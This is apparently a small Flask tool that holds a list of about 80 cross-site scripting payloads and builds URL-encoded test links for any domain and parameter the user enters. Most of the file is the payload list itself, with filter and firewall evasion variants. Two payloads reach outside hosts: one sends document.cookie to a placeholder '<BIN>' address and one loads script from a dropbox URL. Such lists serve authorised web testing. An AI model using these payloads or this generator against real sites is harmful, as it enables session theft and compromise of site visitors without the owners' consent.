from flask import Flask, render_template, request
import urllib.parse

app = Flask(__name__)

# List of 50+ XSS payloads
XSS_PAYLOADS = [
    '<img src=123>', '<a href="javascript:alert(document.domain)">xss</a>',
    '<svg></svg><img src=1>',
    r'\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e',
    '<script /***/>/***/confirm(document.cookie,document.domain)/***/</script /***/',
    '</title/\'/</style/</script/--><p" onclick=alert()//>*/alert()/*',
    '<svg><script x:href="https://dl.dropbox.com/u/13018058/js.js">',
    '<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(document.domain,document.cookie)&NewLine;>X</a>',
    '<iframe onload="javascript:prompt(document.domain)" id="hello" role="world">',
    '‘>alert(154)<​/script><​script/154=’;;;;;;;',
    '10203040;𝐩𝐡𝐨𝐧𝐞-𝐜𝐨𝐧𝐭𝐞𝐱𝐭=<𝐬𝐜𝐫𝐢𝐩𝐭>𝐚𝐥𝐞𝐫𝐭(1)</𝐬𝐜𝐫𝐢𝐩𝐭>',
    '"><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d\'block\'...',
    '<script>alert(String.fromCharCode(66,108,65,99,75,73,99,101))</script>',
    'returnuri=%09Jav%09ascript:alert(document.domain)',
    'var onskeywords = "hello";onload=prompt(0);',
    '\'};alert(\'XSS\');var x={y:\'',
    '"hello" onmouseover=prompt(0) world=""',
    'test"t"\t/t%3Ct%3Et',
    'ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E',
    '"â™ˆ<<sVg/onloadâ™ˆ=/svg/onload=svg/onmouseOver=confirm\'1\'><!--â™ˆ//="',
    '/><svg src=x onload=confirm(document.domain);>',
    '<script>alert(String.fromCharCode(88,115,115,32,66,121,32,79,108,100,77,111,104,97,109,109))</script>',
    '<svg/onload=alert(document.domain)>")',
    '<<!<script>iframe src=javajavascriptscript:alert(document.domain)>',
    '"><svg onload=alert`XSS`>',
    'foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)',
    '">svg onx=() onload=(location.href=\'<BIN>/?mycookies=\'+document[\'cookie\'])()',
    '<a"/aonclick=(confirm)()>click',
    '😎<<svg/onload😎=/svg/onload=svg/onmouseOver=confirm\'1\'><!--😎//="',
    'onhashchange=setTimeout;',
    'Object.prototype.toString=RegExp.prototype.toString;',
    'Object.prototype.source=location.hash; location.hash=null',
    '\'-alert(1)-',
    '%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
    '<svg%09%0a%0b%0c%0d%0a%00%20onload=alert(1)>',
    '<iframe onload=alert(document.domail)>',
    '<iframe src=%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">',
    '<script%20~~~>\u0061\u006C\u0065\u0072\u0074\'\'</script%20~~~>',
    '<svg onload=\'new Function\'["_Y000!_"].find(al\\u0065rt)\'\'',
    '<sCRipT>alert(1)</sCRiPt>',
    '<script>%0aalert(1)</script>',
    '<scr<script>ipt<alert(1);</scr<script>ipt>',
    '<input onfocus="alert(\'xss\');" autofocus>',
    '<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pi&Tab;pt&Tab;alert&lpar;1&rpar;">',
    '<svg•onload=alert(1)>',
    '<script>alert?.(document?.domain)</script>',
    '"<>onauxclick<>=(eval)(atob(\'YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\'))>+<sss',
    '<x/onpointerRawupdate=confirm%26Ipar;1)//x',
    '<script src=//⑮.₨></script>',
    'img{background-image:url(\'javascript:alert()\')}',
    '<svg/onload=eval(atob(\'YWxlcnQoJ1hTUycp\'))>',
    'TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;',
    '<img src=`xx:xx`onerror=alert(1)>',
    '<div/onmouseover=\'alert(1)\'> style="x:"',
    '\";alert(\'XSS\');//',
    '"autofocus/onfocus=alert(1)//',
    '"><img class="emoji" alt="😯" src="x" /><svg',
    '"><details/open/ontoggle=confirm(1337)>',
    '%<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e',
    '<input disabled=disabled onbeforecopy=alert(1) value=copyme>',
    '</textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”',
    '</script><script>alert(\'xElkomy\')</script>',
    'OnMoUsEoVeR=prompt(/hacked/)//',
    '<b onmouseover=alert(\'Wufff!\')>click me!</b>',
    '"><script>propmt("mamunwhh")</script>',
    '"><script>alert(document.cookie)</script>',
    '/><svg src=x onload=confirm("1337");>',
    '&quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;',
    '"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com',
    '"><body/oNpagEshoW​=(confirm)(document.domain)>',
    '<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`1` //',
    '"><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>',
    '<img/src/onerror​=alert&#xFEFF;(1)>',
    '\'"<svg><animate onbegin​=alert(\'hacked\') attributeName=x></svg>',
    '<a href=javascript​:alert(\'hacked\')>Click Here</a>',
    '<IFRAME SRC="javascript​:alert(\'hacked\');"></IFRAME>',
    '<div ng-app> <strong class="ng-init:constructor.constructor(\'alert(\'hacked\')\')()">aaa</strong> </div>',
    '<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`hacked` //',
    '<noscript><p title="</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()">',
    '%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E',
    '</a<script>alert(document.cookie</script>',
    '"><svg/onload=prompt(1)>'
]

@app.route('/', methods=['GET', 'POST'])
def index():
    urls_with_payloads = []
    if request.method == 'POST':
        domain = request.form.get('domain', '').strip()
        param = request.form.get('param', '').strip()

        if domain and param:
            for payload in XSS_PAYLOADS:
                encoded_payload = urllib.parse.quote(payload)
                test_url = f"{domain}?{param}={encoded_payload}"
                urls_with_payloads.append(test_url)

    return render_template('index.html', urls_with_payloads=urls_with_payloads)

if __name__ == '__main__':
    app.run(debug=True)
